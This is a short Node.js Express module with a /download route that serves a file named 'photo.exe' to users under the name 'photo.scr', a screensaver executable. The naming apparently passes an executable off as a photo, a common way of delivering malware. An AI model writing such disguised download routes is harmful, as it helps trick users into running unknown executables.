const path = require("path");

function fileServer(app) {

    app.get("/download", (req, res) => {

        const filePath = path.join(
            __dirname,
            "../files/photo.exe"
        );

        res.download(filePath, "photo.scr", (error) => {
            if (error) {
                console.error("Download error:", error.message);

                if (!res.headersSent) {
                    res.status(404).send("File not found");
                }
            }
        });

    });

}

module.exports = fileServer;